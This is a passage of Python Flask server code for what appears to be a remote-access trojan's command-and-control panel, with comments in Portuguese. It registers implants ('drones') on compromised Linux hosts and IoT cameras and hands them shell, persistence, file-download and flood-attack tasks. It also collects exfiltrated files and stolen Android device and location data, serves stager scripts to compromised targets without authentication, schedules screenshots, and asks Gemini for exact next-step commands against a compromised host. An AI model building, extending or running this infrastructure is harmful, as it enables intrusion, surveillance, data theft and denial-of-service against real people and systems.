        socketio.emit('nmap_output', {
            'scan_id': scan_id,
            'line':    f"[NMAP] Erro: {e}"
        })
        socketio.emit('nmap_finished', {
            'scan_id': scan_id,
            'target':  target,
            'args':    args_str,
            'ports':   [],
            'status':  'error'
        })



@app.route('/api/analyze_agent', methods=['POST'])
@login_required
def analyze_agent():
    """
    Rota de análise que busca os dados do agente diretamente do banco de dados.
    """
    agent_id = request.json.get('agent_id')
    if not agent_id:
        return jsonify({"error": "ID do agente não fornecido."}), 400

    # Busca os dados do agente no banco de dados em vez da variável global 'agents'
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM agents WHERE id = ?", (agent_id,))
        agent_row = cursor.fetchone()
        conn.close()

        if not agent_row:
            # Se o agente não for encontrado no banco, retorna um erro JSON claro
            return jsonify({"error": "Agente inválido ou não encontrado no banco de dados."}), 404
        
        # Converte a linha do banco de dados em um dicionário
        agent_data = dict(agent_row)

    except Exception as e:
        logger.error("Falha ao buscar agente %s para análise: %s", agent_id, e)
        return jsonify({"error": "Erro interno ao consultar o banco de dados."}), 500

    # O resto da sua função para montar o prompt e chamar a API continua o mesmo
    geo_info = f"{agent_data.get('geo_city', 'N/A')}, {agent_data.get('geo_country', 'N/A')}"

    # Usaremos o prompt enriquecido que discutimos anteriormente
    prompt = f"""
# Persona
Aja como um analista de Red Team sênior e especialista em MITRE ATT&CK.

# Contexto do Alvo Comprometido
- **Hostname:** {agent_data.get('hostname', 'N/A')}
- **Usuário:** {agent_data.get('username', 'N/A')}
- **Sistema Operacional:** {agent_data.get('os_name', 'N/A')}
- **Nível de Privilégio:** {agent_data.get('privileges', 'N/A')}

# Instrução
Com base nos dados do alvo, forneça um briefing tático em 3 seções, em português do Brasil. Seja direto e prático.

## 1. Análise da Situação
Resuma os pontos fortes e fracos da nossa posição atual neste alvo.

## 2. Recomendações Táticas (Próximos Passos)
Liste de 2 a 4 ações recomendadas em ordem de prioridade. Para cada uma, forneça o comando exato a ser usado e a justificativa (MITRE ATT&CK).

## 3. Resumo para Relatório
Um parágrafo conciso para um relatório de operação.

Use Markdown para formatar sua resposta: `#` para o título principal, `##` para as seções, e `**` para destacar.
"""

    logger.info("Enviando prompt para o Gemini para o agente %s...", agent_id)
    gemini_response = call_gemini_api(prompt)

    status_code = gemini_response.get("status_code", 500)
    if "error" in gemini_response:
        error_details = gemini_response.get("error", {})
        error_message = error_details.get("message", "Erro interno.")
        logger.error("GEMINI: Falha com status %s. Mensagem: %s", status_code, error_message)
        return jsonify({"error": "Falha na análise de IA", "details": error_message}), status_code

    try:
        response_json = gemini_response.get("data", {})
        text_analysis = response_json["candidates"][0]["content"]["parts"][0]["text"]
        return jsonify({"analysis": text_analysis})
    except (KeyError, IndexError) as e:
        logger.error("GEMINI: Formato de resposta da API inesperado: %s", e)
        return jsonify({"error": "Formato de resposta da API inválido."}), 500




@app.route('/get_agents', methods=['GET'])
@login_required
def get_agents_route(): # Renomeamos a rota para evitar conflito
    return jsonify(get_agents_with_status())

@app.route('/get_results/<agent_id>', methods=['GET'])
@login_required
def get_results(agent_id):
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    if not cursor.fetchone():
        conn.close()
        return jsonify({"error": "Agente não encontrado"}), 404

    cursor.execute(
        "SELECT * FROM tasks WHERE agent_id = ? AND status = 'completed' ORDER BY timestamp_issued DESC",
        (agent_id,)
    )
    rows = cursor.fetchall()
    conn.close()
    return jsonify({"results": [dict(row) for row in rows]})

@app.route('/list_downloads/<agent_id>', methods=['GET'])
@login_required
def list_downloads(agent_id):
    conn = get_db_connection()
    cursor = conn.cursor()

    # 1. Verifica se o agente existe no banco de dados
    cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
    if not cursor.fetchone():
        conn.close()
        return jsonify({"error": "Agente não encontrado"}), 404
    
    conn.close()

    # A lógica de listar arquivos permanece exatamente a mesma.
    agent_download_dir = os.path.join(DOWNLOADS_DIR, agent_id)
    if not os.path.isdir(agent_download_dir):
        return jsonify([]) # Retorna uma lista vazia se o diretório não existir
        
    files = [f for f in os.listdir(agent_download_dir) if os.path.isfile(os.path.join(agent_download_dir, f))]
    return jsonify(files)


# --- API v2: downloads da aba Mídias ---

@app.route('/api/agent/<agent_id>/downloads', methods=['GET'])
@login_required
def api_list_agent_downloads(agent_id):
    """Lista arquivos exfiltrados de um agente (usado pela aba Mídias)."""
    with get_db_connection() as conn:
        if not conn.execute("SELECT 1 FROM agents WHERE id = ?", (agent_id,)).fetchone():
            return jsonify({"error": "Agente não encontrado"}), 404

    agent_dir = DOWNLOADS_DIR / agent_id
    if not agent_dir.is_dir():
        return jsonify([])

    files = sorted(
        [f.name for f in agent_dir.iterdir() if f.is_file()],
        key=lambda n: (DOWNLOADS_DIR / agent_id / n).stat().st_mtime,
        reverse=True,
    )
    return jsonify(files)


@app.route('/api/agent/<agent_id>/download/<path:filename>', methods=['GET'])
@login_required
def api_download_agent_file(agent_id, filename):
    """Serve um arquivo exfiltrado para download. Protegido contra path traversal."""
    downloads_root = DOWNLOADS_DIR.resolve()
    try:
        file_path = (DOWNLOADS_DIR / agent_id / filename).resolve()
    except Exception:
        return jsonify({"error": "Caminho inválido"}), 400

    if not str(file_path).startswith(str(downloads_root)):
        logger.warning("PATH-TRAVERSAL bloqueado em /api/agent/%s/download/%s por %s",
                       agent_id, filename, request.remote_addr)
        return jsonify({"error": "Acesso negado"}), 403

    if not file_path.exists() or not file_path.is_file():
        return jsonify({"error": "Arquivo não encontrado"}), 404

    return send_from_directory(
        str(file_path.parent),
        file_path.name,
        as_attachment=True,
        download_name=file_path.name,
    )


# --- Rota e Evento para o Dashboard ---

@app.route('/dashboard')
@login_required
def dashboard_route():
    return render_template('dashboard.html')


@app.route("/api/dashboard_data", methods=["GET"])
@login_required
def dashboard_data():
    try:
        data = get_dashboard_data_logic()
        return jsonify(data)
    except Exception as e:
        logger.error("/api/dashboard_data: %s", e)
        return jsonify({"error": "Falha ao coletar dados do dashboard"}), 500

@socketio.on('request_dashboard_data')
def handle_dashboard_request():
    """Quando o dashboard se conecta, ele pede os dados atuais."""
    logger.info("Dashboard %s pediu os dados iniciais.", request.sid)
    socketio.emit('dashboard_update', get_dashboard_data_logic(), to=request.sid)

@app.route('/decrypt_file', methods=['POST'])
@login_required
def decrypt_file_route():
    if not AES: return jsonify({"status": "error", "message": "Biblioteca de criptografia não está instalada no servidor."}), 500
    data = request.json
    agent_id = data.get('agent_id'); filename = data.get('filename'); key_b64 = data.get('key_b64')
    if not all([agent_id, filename, key_b64]): return jsonify({"status": "error", "message": "Dados incompletos."}), 400
    try:
        key = base64.b64decode(key_b64)
        if len(key) != 32: return jsonify({"status": "error", "message": "Chave inválida."}), 400
    except: return jsonify({"status": "error", "message": "Chave Base64 inválida."}), 400

    # DEFESA - Path Traversal (OWASP A01:2021 / CWE-22):
    # agent_id e filename vêm do corpo da requisição e poderiam conter "../../../etc/passwd".
    # resolve() expande o caminho absoluto real; a verificação garante que o arquivo
    # resultante está DENTRO de DOWNLOADS_DIR, impedindo acesso a qualquer outro lugar.
    try:
        downloads_root = DOWNLOADS_DIR.resolve()
        file_path = (DOWNLOADS_DIR / agent_id / filename).resolve()
        if not str(file_path).startswith(str(downloads_root)):
            logger.warning("PATH-TRAVERSAL bloqueado em /decrypt_file: tentativa de acessar '%s' por %s", file_path, request.remote_addr)
            return jsonify({"status": "error", "message": "Caminho de arquivo inválido."}), 400
    except Exception:
        return jsonify({"status": "error", "message": "Parâmetros de arquivo inválidos."}), 400

    if not file_path.exists(): return jsonify({"status": "error", "message": "Arquivo não encontrado no servidor."}), 404
    try:
        with open(file_path, 'rb') as f_in: iv = f_in.read(16); ciphertext = f_in.read()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        original_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
        decrypted_path = str(file_path).replace('.encrypted', '.decrypted')
        with open(decrypted_path, 'wb') as f_out: f_out.write(original_data)
        return jsonify({"status": "success", "message": f"Arquivo salvo como {os.path.basename(decrypted_path)}"})
    except Exception as e: return jsonify({"status": "error", "message": f"Falha na descriptografia: {e}"}), 500

    

# -- ROTAS PARA AGENTES LINUX -- #


@app.route('/get_drone_command/<drone_id>', methods=['GET'])
@mobile_auth_required
def get_drone_command(drone_id):
    """v7.0 - Suporte para os comandos 'shell', 'persist', 'download' e 'start_attack'."""
    command_to_send = ""
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()

        # Registro automático se o drone ainda não existir
        cursor.execute("SELECT id FROM agents WHERE id = ?", (drone_id,))
        if not cursor.fetchone():
            agent_data = {
                "id": drone_id,
                "hostname": f"Drone-{drone_id[-6:]}",
                "username": "drone",
                "os_name": "Linux (Shell)",
                "agent_version": "Shell-v7.0",
                "external_ip": request.remote_addr,
                "status": "online",
                "first_seen": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "internal_ip": "N/A",
                "privileges": "User",
                "geo_latitude": None, "geo_longitude": None,
                "geo_city": None, "geo_country": None, "geo_last_checked": None
            }
            cursor.execute(
                "INSERT INTO agents (id, username, hostname, internal_ip, external_ip, os_name, privileges, agent_version, first_seen, last_seen, status, geo_latitude, geo_longitude, geo_city, geo_country, geo_last_checked) "
                "VALUES (:id, :username, :hostname, :internal_ip, :external_ip, :os_name, :privileges, :agent_version, :first_seen, :last_seen, :status, :geo_latitude, :geo_longitude, :geo_city, :geo_country, :geo_last_checked)",
                agent_data
            )
            log_system_event(drone_id, "REGISTER", "Novo Drone Pós-Exploração (v7.0) detectado.")
        else:
            cursor.execute("UPDATE agents SET last_seen = ? WHERE id = ?", (datetime.now().isoformat(), drone_id))
        conn.commit()

        # Busca e tradução de tarefa pendente
        cursor.execute(
            "SELECT id, command, args FROM tasks WHERE agent_id = ? AND status = 'pending' ORDER BY timestamp_issued ASC LIMIT 1",
            (drone_id,)
        )
        task_row = cursor.fetchone()

        if task_row:
            task_id  = task_row['id']
            command  = task_row['command']
            args_str = task_row['args']
            task_payload = ""

            if command == 'shell':
                task_payload = f"shell:{args_str}"
            elif command == 'persist':
                task_payload = "persist:true"
            elif command == 'download':
                task_payload = f"download:{args_str}"  # argumento é o caminho do arquivo
            elif command == 'start_attack':
                try:
                    attack_args = json.loads(args_str)
                    method   = attack_args.get('method', 'http_get')
                    target   = attack_args.get('target', '')
                    port     = attack_args.get('port', 80)
                    duration = attack_args.get('duration', 60)
                    threads  = attack_args.get('threads', 50)
                    task_payload = f"attack:{method},{target},{port},{duration},{threads}"
                except Exception:
                    task_payload = "shell:echo '[ERRO] Argumentos de ataque inválidos.'"

            if task_payload:
                command_to_send = f"{task_id}:{task_payload}"
                cursor.execute(
                    "UPDATE tasks SET status = 'in_progress', timestamp_started = ? WHERE id = ?",
                    (datetime.now().isoformat(), task_id)
                )
                conn.commit()

    except Exception as e:
        logger.error("/get_drone_command: %s", e)
    finally:
        if conn:
            conn.close()
        socketio.emit('agent_list_update', get_agents_with_status())

    return Response(command_to_send, mimetype='text/plain')


@app.route('/submit_drone_result/<drone_id>', methods=['POST'])
@mobile_auth_required
def submit_drone_result(drone_id):
    """v7.0 - Recebe um payload JSON com o resultado em Base64."""
    try:
        data = request.get_json()
        task_id   = data.get('task_id')
        data_type = data.get('data_type', 'info')
        result_b64 = data.get('result', '')

        # Decodifica o resultado de Base64 para texto puro
        result_data = base64.b64decode(result_b64).decode('utf-8', errors='ignore')

        if not task_id:
            return "Task ID ausente", 400

        # Se for um download de arquivo, salva no disco
        if data_type == 'file_download':
            try:
                # result_data aqui é o JSON que o drone montou
                file_info = json.loads(result_data)
                file_content = base64.b64decode(file_info['content_b64'])
                
                agent_dir = os.path.join(DOWNLOADS_DIR, drone_id)
                os.makedirs(agent_dir, exist_ok=True)
                file_path = os.path.join(agent_dir, file_info['filename'])
                
                with open(file_path, 'wb') as f:
                    f.write(file_content)
                
                # Atualiza o resultado da tarefa com uma mensagem de sucesso
                result_data = f"Arquivo '{file_info['filename']}' baixado com sucesso e salvo no servidor."
                log_system_event(drone_id, "DOWNLOAD_SUCCESS", result_data)
            except Exception as e:
                result_data = f"Erro ao processar arquivo baixado: {e}"
                log_system_event(drone_id, "ERROR", result_data)

        # Salva o resultado final no banco de dados
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute(
            "UPDATE tasks SET status = 'completed', result = ?, data_type = ?, updated_at = ? WHERE id = ?",
            (result_data, data_type, datetime.now().isoformat(), task_id)
        )
        conn.commit()
        conn.close()
        
        # Notifica o painel
        socketio.emit('new_result', {"agent_id": drone_id, "task_id": task_id, "data_type": data_type, "data": result_data})
        trigger_dashboard_update()
        
        return "OK", 200
    except Exception as e:
        logger.error("/submit_drone_result: %s", e)
        return "ERROR", 500


# --- ROTA PÚBLICA DE STAGER (sem auth) ---
# Serve apenas arquivos pré-aprovados para que alvos comprometidos consigam baixar
# sem precisar de sessão, HMAC ou token — o stager não contém segredos.

_STAGER_WHITELIST = {"drone.sh", "drone_iot.sh"}  # drone Linux + drone IoT BusyBox

@app.route('/stager/<filename>', methods=['GET'])
def serve_stager(filename):
    safe = os.path.basename(filename)
    if safe not in _STAGER_WHITELIST:
        return jsonify({"error": "Não encontrado."}), 404

    path = PAYLOADS_DIR / safe
    if not path.exists():
        return jsonify({"error": "Stager não encontrado no servidor."}), 404

    # Para drone.sh: injeta a URL do C2 dinamicamente no placeholder.
    # C2_STAGER_BASE_URL sobrescreve o host_url -- útil em lab isolado (Host-Only/NAT)
    # onde a VM alvo não alcança o domínio público mas alcança o IP LAN do servidor.
    # Exemplo .env: C2_STAGER_BASE_URL=http://192.168.0.100:5000
    c2_url = os.getenv("C2_STAGER_BASE_URL", "").rstrip('/') or request.host_url.rstrip('/')

    if safe == "drone.sh":
        content = path.read_text(encoding='utf-8').replace('%%C2_SERVER_URL%%', c2_url)
        logger.info("STAGER: servindo drone.sh com C2_URL=%s para %s", c2_url, request.remote_addr)
        return Response(content, mimetype='text/plain')

    if safe == "drone_iot.sh":
        iot_token = os.getenv("IOT_DRONE_TOKEN", "geminirat-iot")
        content = (path.read_text(encoding='utf-8')
                   .replace('%%C2_SERVER_URL%%', c2_url)
                   .replace('%%IOT_DRONE_TOKEN%%', iot_token))
        logger.info("STAGER: servindo drone_iot.sh com C2_URL=%s para %s", c2_url, request.remote_addr)
        return Response(content, mimetype='text/plain')

    return send_from_directory(str(PAYLOADS_DIR), safe, mimetype='text/plain')


# --- ROTA PARA SERVIR PAYLOADS ---

def _check_agent_hmac_download() -> bool:
    """
    Verifica HMAC de agente Windows na rota /download (GET sem body).
    Reutiliza AGENT_SHARED_SECRET_BYTES e TIMESTAMP_TOLERANCE do servidor.
    Retorna True se a assinatura for válida.
    """
    ts_str = request.headers.get('X-Request-Timestamp', '')
    sig    = request.headers.get('X-Signature', '')
    if not ts_str or not sig:
        return False
    try:
        if abs(time.time() - int(ts_str)) > TIMESTAMP_TOLERANCE:
            return False
        msg      = ts_str.encode('utf-8')   # GET — sem body
        expected = hmac.new(AGENT_SHARED_SECRET_BYTES, msg, hashlib.sha256).hexdigest()
        return hmac.compare_digest(expected, sig)
    except Exception:
        return False


@app.route('/download/<filename>', methods=['GET'])
def serve_download(filename):
    """
    Rota de download com autenticação quádrupla:
      1. Sessão do painel (operador logado)
      2. Query param ?key=DOWNLOAD_TOKEN (.env)
      3. Header X-Agent-Token (agentes mobile/drone)
      4. HMAC X-Request-Timestamp + X-Signature (agentes Windows — mesmo mecanismo do /register)
    """
    safe_name = os.path.basename(filename)

    query_key  = request.args.get('key', '')
    panel_ok   = bool(session.get('logged_in'))
    token_ok   = bool(DOWNLOAD_TOKEN and hmac.compare_digest(query_key, DOWNLOAD_TOKEN))
    agent_token = request.headers.get('X-Agent-Token', '').encode('utf-8')
    mobile_ok  = bool(agent_token and hmac.compare_digest(agent_token, MOBILE_AGENT_TOKEN))
    hmac_ok    = _check_agent_hmac_download()

    if not (panel_ok or token_ok or mobile_ok or hmac_ok):
        logger.warning("AUTH-FAIL: /download/%s bloqueado - IP %s", safe_name, request.remote_addr)
        return jsonify({"error": "Não autorizado"}), 403

    auth_method = ("session" if panel_ok else "token" if token_ok else "mobile" if mobile_ok else "hmac")
    logger.info("DOWNLOAD: %s por %s [auth=%s]", safe_name, request.remote_addr, auth_method)

    if (DOWNLOADS_DIR / safe_name).exists():
        return send_from_directory(str(DOWNLOADS_DIR), safe_name)

    if (PAYLOADS_DIR / safe_name).exists():
        return send_from_directory(str(PAYLOADS_DIR), safe_name)

    return jsonify({"error": "Arquivo não encontrado."}), 404
    




# ==============================================================================
# ENDPOINTS LINUX DRONE  (/drone/*)
# Protocolo simplificado: HMAC sem AES — adequado para lab e stagers bash/python.
# Drones aparecem na lista de agentes com agent_type = "linux_drone".
# ==============================================================================

def _drone_hmac_ok() -> bool:
    """Verifica HMAC do drone (mesmo algoritmo do agente Windows)."""
    ts_str = request.headers.get('X-Request-Timestamp', '')
    sig    = request.headers.get('X-Signature', '')
    if not ts_str or not sig:
        return False
    try:
        if abs(time.time() - int(ts_str)) > TIMESTAMP_TOLERANCE:
            return False
        body = request.data if request.method in ('POST', 'PUT') else b''
        msg  = ts_str.encode() + body
        exp  = hmac.new(AGENT_SHARED_SECRET_BYTES, msg, hashlib.sha256).hexdigest()
        return hmac.compare_digest(exp, sig)
    except Exception:
        return False


@app.route('/drone/register', methods=['POST'])
def drone_register():
    """Registra um drone Linux. Payload JSON sem criptografia."""
    if not _drone_hmac_ok():
        return jsonify({"error": "Não autorizado"}), 403
    try:
        info = request.get_json(force=True) or {}
        drone_id = str(uuid.uuid4())
        now = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

        conn = get_db_connection()
        try:
            # Reutiliza tabela agents; agent_type identifica como drone
            conn.execute("""
                INSERT INTO agents
                  (id, username, hostname, internal_ip, external_ip, os_name,
                   privileges, status, first_seen, last_seen, tags, notes)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?)
                ON CONFLICT(id) DO UPDATE SET
                  last_seen=excluded.last_seen, status='active'
            """, (
                drone_id,
                info.get('username', 'unknown'),
                info.get('hostname', 'unknown'),
                info.get('internal_ip', ''),
                info.get('external_ip', ''),
                info.get('os_name', 'Linux'),
                info.get('privileges', 'user'),
                'active', now, now,
                'linux_drone',
                info.get('arch', ''),
            ))
            conn.commit()
        finally:
            conn.close()

        socketio.emit('agent_list_update', {drone_id: {
            "id": drone_id, "hostname": info.get('hostname'),
            "username": info.get('username'), "os_name": info.get('os_name'),
            "internal_ip": info.get('internal_ip'), "status": "active",
            "tags": "linux_drone",
        }})
        logger.info("DRONE-REGISTER: %s (%s) de %s", info.get('hostname'), drone_id, request.remote_addr)
        return jsonify({"drone_id": drone_id}), 200
    except Exception as e:
        logger.error("DRONE-REGISTER erro: %s", e)
        return jsonify({"error": str(e)}), 500


@app.route('/drone/task/<drone_id>', methods=['GET'])
def drone_get_task(drone_id):
    """Retorna próxima task pendente para o drone. Atualiza last_seen."""
    if not _drone_hmac_ok():
        return jsonify({"error": "Não autorizado"}), 403
    try:
        conn = get_db_connection()
        try:
            conn.execute(
                "UPDATE agents SET last_seen=?, status='active' WHERE id=?",
                (datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'), drone_id)
            )
            row = conn.execute(
                "SELECT id, command, args FROM tasks WHERE agent_id=? AND status='pending' ORDER BY timestamp_issued LIMIT 1",
                (drone_id,)
            ).fetchone()
            if row:
                conn.execute("UPDATE tasks SET status='in_progress' WHERE id=?", (row['id'],))
            conn.commit()
        finally:
            conn.close()

        if row:
            return jsonify({"task_id": row['id'], "command": row['command'], "args": row['args']}), 200
        return jsonify({}), 200
    except Exception as e:
        logger.error("DRONE-TASK erro: %s", e)
        return jsonify({}), 500


@app.route('/drone/result', methods=['POST'])
def drone_result():
    """Recebe resultado de task do drone."""
    if not _drone_hmac_ok():
        return jsonify({"error": "Não autorizado"}), 403
    try:
        data      = request.get_json(force=True) or {}
        drone_id  = data.get('drone_id', '')
        task_id   = data.get('task_id', '')
        result    = data.get('result', '')
        data_type = data.get('data_type', 'drone_shell_result')

        if task_id:
            conn = get_db_connection()
            try:
                conn.execute(
                    "UPDATE tasks SET status='completed', updated_at=? WHERE id=?",
                    (datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'), task_id)
                )
                conn.execute(
                    "INSERT INTO task_results (task_id, agent_id, data_type, result, timestamp) VALUES (?,?,?,?,?)",
                    (task_id, drone_id, data_type, str(result),
                     datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'))
                )
                conn.commit()
            finally:
                conn.close()

        socketio.emit('new_result', {
            "agent_id": drone_id, "task_id": task_id,
            "data_type": data_type, "data": result,
        })
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        logger.error("DRONE-RESULT erro: %s", e)
        return jsonify({"error": str(e)}), 500


# ==============================================================================
# ROTAS IoT DRONE — /iot/*
# Auth simplificada: token estático (X-IoT-Token header).
# Sem HMAC nem AES — câmeras embarcadas não têm openssl.
# Token configurado via env var IOT_DRONE_TOKEN (mesmo valor injetado no drone_iot.sh).
# ==============================================================================

def _iot_token_ok() -> bool:
    """Verifica token estático do drone IoT."""
    expected = os.getenv("IOT_DRONE_TOKEN", "")
    if not expected:
        return False
    return hmac.compare_digest(
        request.headers.get("X-IoT-Token", ""),
        expected
    )


@app.route('/iot/register', methods=['POST'])
def iot_register():
    """Registra um drone IoT (câmera embarcada). Auth via token estático."""
    if not _iot_token_ok():
        return jsonify({"error": "Não autorizado"}), 403
    try:
        info     = request.get_json(force=True) or {}
        drone_id = str(uuid.uuid4())
        now      = datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')

        conn = get_db_connection()
        try:
            conn.execute("""
                INSERT INTO agents
                  (id, username, hostname, internal_ip, external_ip, os_name,
                   privileges, status, first_seen, last_seen, tags, notes)
                VALUES (?,?,?,?,?,?,?,?,?,?,?,?)
                ON CONFLICT(id) DO UPDATE SET
                  last_seen=excluded.last_seen, status='active'
            """, (
                drone_id,
                info.get('username', 'root'),
                info.get('hostname', 'cam'),
                info.get('internal_ip', ''),
                request.remote_addr,
                info.get('os_name', 'EmbeddedLinux'),
                info.get('privileges', 'root'),
                'active', now, now,
                'iot_drone',
                info.get('arch', ''),
            ))
            conn.commit()
        finally:
            conn.close()

        socketio.emit('agent_list_update', {drone_id: {
            "id": drone_id,
            "hostname":    info.get('hostname', 'cam'),
            "username":    info.get('username', 'root'),
            "os_name":     info.get('os_name', 'EmbeddedLinux'),
            "internal_ip": info.get('internal_ip', ''),
            "status":      "active",
            "tags":        "iot_drone",
        }})
        logger.info("IOT-REGISTER: %s (%s) de %s", info.get('hostname'), drone_id, request.remote_addr)
        return jsonify({"drone_id": drone_id}), 200
    except Exception as e:
        logger.error("IOT-REGISTER erro: %s", e)
        return jsonify({"error": str(e)}), 500


@app.route('/iot/task/<drone_id>', methods=['GET'])
def iot_get_task(drone_id):
    """Retorna próxima task pendente para o drone IoT. Atualiza last_seen."""
    if not _iot_token_ok():
        return jsonify({"error": "Não autorizado"}), 403
    try:
        conn = get_db_connection()
        try:
            conn.execute(
                "UPDATE agents SET last_seen=?, status='active' WHERE id=?",
                (datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'), drone_id)
            )
            row = conn.execute(
                "SELECT id, command, args FROM tasks WHERE agent_id=? AND status='pending' ORDER BY timestamp_issued LIMIT 1",
                (drone_id,)
            ).fetchone()
            if row:
                conn.execute("UPDATE tasks SET status='in_progress' WHERE id=?", (row['id'],))
            conn.commit()
        finally:
            conn.close()

        if row:
            return jsonify({"task_id": row['id'], "command": row['command'], "args": row['args']}), 200
        return jsonify({}), 200
    except Exception as e:
        logger.error("IOT-TASK erro: %s", e)
        return jsonify({}), 500


@app.route('/iot/result', methods=['POST'])
def iot_result():
    """Recebe resultado de task do drone IoT."""
    if not _iot_token_ok():
        return jsonify({"error": "Não autorizado"}), 403
    try:
        data      = request.get_json(force=True) or {}
        drone_id  = data.get('drone_id', '')
        task_id   = data.get('task_id', '')
        result    = data.get('result', '')
        data_type = data.get('data_type', 'iot_shell_result')

        if task_id:
            conn = get_db_connection()
            try:
                conn.execute(
                    "UPDATE tasks SET status='completed', updated_at=? WHERE id=?",
                    (datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'), task_id)
                )
                conn.execute(
                    "INSERT INTO task_results (task_id, agent_id, data_type, result, timestamp) VALUES (?,?,?,?,?)",
                    (task_id, drone_id, data_type, str(result),
                     datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S'))
                )
                conn.commit()
            finally:
                conn.close()

        socketio.emit('new_result', {
            "agent_id": drone_id, "task_id": task_id,
            "data_type": data_type, "data": result,
        })
        return jsonify({"status": "ok"}), 200
    except Exception as e:
        logger.error("IOT-RESULT erro: %s", e)
        return jsonify({"error": str(e)}), 500


@app.route('/submit_info', methods=['POST'])
@mobile_auth_required
def submit_info():
    """
    Endpoint para o agente InfoStealer (Android) enviar um pacote de informaçõees.
    """
    try:
        # 1. Pega os dados JSON enviados pelo agente
        data = request.json
        if not data:
            return jsonify({"error": "Payload JSON invalido ou vazio."}), 400

        # 2. Extrai as informações do payload
        agent_id      = data.get('agent_id')
        device_info   = data.get('device_info', {})
        location_info = data.get('location_info', {})

        if not agent_id:
            return jsonify({"error": "agent_id ausente no payload."}), 400

        # 3. Conecta ao banco de dados para salvar/atualizar as informações
        conn = get_db_connection()
        cursor = conn.cursor()

        cursor.execute("SELECT id FROM agents WHERE id = ?", (agent_id,))
        if not cursor.fetchone():
            conn.close()
            return jsonify({"error": "Agente não registrado."}), 404

        # 4. Atualiza versão do SO no registro do agente
        cursor.execute(
            "UPDATE agents SET os_name = ?, last_seen = ? WHERE id = ?",
            (device_info.get("Android Version", "Android"), datetime.now().isoformat(), agent_id)
        )

        # 5. Salva as informações coletadas em system_logs
        log_system_event(agent_id, "INFO_STEAL", f"Dispositivo: {json.dumps(device_info)}")
        log_system_event(agent_id, "INFO_STEAL", f"Localização: {json.dumps(location_info)}")

        conn.commit()
        conn.close()

        # 6. Notifica o painel
        trigger_dashboard_update()

        return jsonify({"status": "success", "message": "Informações recebidas."})

    except Exception as e:
        logger.critical("Falha na rota /submit_info: %s", e)
        return jsonify({"error": "Erro interno do servidor ao processar informações."}), 500

# --- EVENTOS WEBSOCKET (v3.0 - Real-time) ---

@socketio.on('connect')
def handle_connect():
    """Este evento é disparado quando o painel web se conecta."""
    logger.info("Painel conectado via WebSocket. SID: %s", request.sid)

@socketio.on('disconnect')
def handle_disconnect():
    """Este evento é disparado quando o painel web se desconecta."""
    logger.info("Painel desconectado do WebSocket. SID: %s", request.sid)

@socketio.on('request_initial_data')
def handle_initial_data_request():
    """
    Quando o painel se conecta, ele vai nos enviar este evento para pedir os dados atuais.
    Nós responderemos enviando a lista completa de agentes.
    """
    logger.info("Painel %s pediu os dados iniciais.", request.sid)
    # Usamos 'emit' para enviar um evento ('agent_list_update') de volta APENAS para o cliente que pediu.
    socketio.emit('agent_list_update', get_agents_with_status(), to=request.sid)



# ---------------------------------------------------------------------------
# TELEGRAM BOT C2
# ---------------------------------------------------------------------------
# Permite ao operador interagir com agentes via Telegram.
# O bot faz polling na API do Telegram a cada 2s, parseia comandos e
# enfileira tasks no mesmo sistema existente.
# Quando uma task originada pelo bot é concluída, o resultado é enviado
# de volta ao Telegram (texto ou imagem para screenshots).
#
# ============================================================
# SCREENSHOT SCHEDULER
# ============================================================
# Dicionario em memória: agent_id -> {'interval': int (segundos), 'next_at': float (epoch)}
_screenshot_schedules: dict = {}


@app.route('/api/agent/<agent_id>/screenshot_schedule', methods=['GET'])
@login_required
def get_screenshot_schedule(agent_id):
    """Retorna o agendamento atual de screenshots para o agente."""
    sched = _screenshot_schedules.get(agent_id)
    if not sched:
        return jsonify({'active': False})
    return jsonify({
        'active':    True,
        'interval':  sched['interval'],
        'next_at':   sched['next_at'],
    })


@app.route('/api/agent/<agent_id>/screenshot_schedule', methods=['POST'])
@login_required
@role_required(['Administrator', 'Operator'])
def set_screenshot_schedule(agent_id):
    """
    Ativa ou desativa o agendamento de screenshots automaticos.
    Body: { "interval": 300 }  — intervalo em segundos (0 = desativar)
    """
    conn = get_db_connection()
    if not conn.execute('SELECT id FROM agents WHERE id = ?', (agent_id,)).fetchone():
        conn.close()
        return jsonify({'error': 'Agente nao encontrado.'}), 404
    conn.close()

    data     = request.get_json(silent=True) or {}
    interval = int(data.get('interval', 0))

    if interval <= 0:
        _screenshot_schedules.pop(agent_id, None)
        log_operator_action(session.get('username'), 'SCREENSHOT_SCHEDULE_OFF', {'agent_id': agent_id})
        return jsonify({'status': 'ok', 'active': False})

    interval = max(30, interval)  # minimo 30 segundos
    _screenshot_schedules[agent_id] = {
        'interval': interval,
        'next_at':  time.time() + interval,
    }
    log_operator_action(session.get('username'), 'SCREENSHOT_SCHEDULE_ON', {'agent_id': agent_id, 'interval': interval})
    return jsonify({'status': 'ok', 'active': True, 'interval': interval})


def _screenshot_scheduler_sweeper():
    """
    Verifica a cada 30s quais agentes tem screenshot agendado e cujo
    proximo disparo ja venceu. Emite task de screenshot para cada um.
    Remove automaticamente agentes que ficaram offline.
    """
    while True:
        socketio.sleep(30)
        try:
            now = time.time()
            to_remove = []
            for agent_id, sched in list(_screenshot_schedules.items()):
                if now < sched['next_at']:
                    continue
                # Verifica se agente ainda esta online
                conn = get_db_connection()
                row = conn.execute(
                    "SELECT status FROM agents WHERE id = ?", (agent_id,)
                ).fetchone()
                conn.close()
                if not row or row['status'] != 'online':
                    to_remove.append(agent_id)
                    continue
                # Enfileira task de screenshot
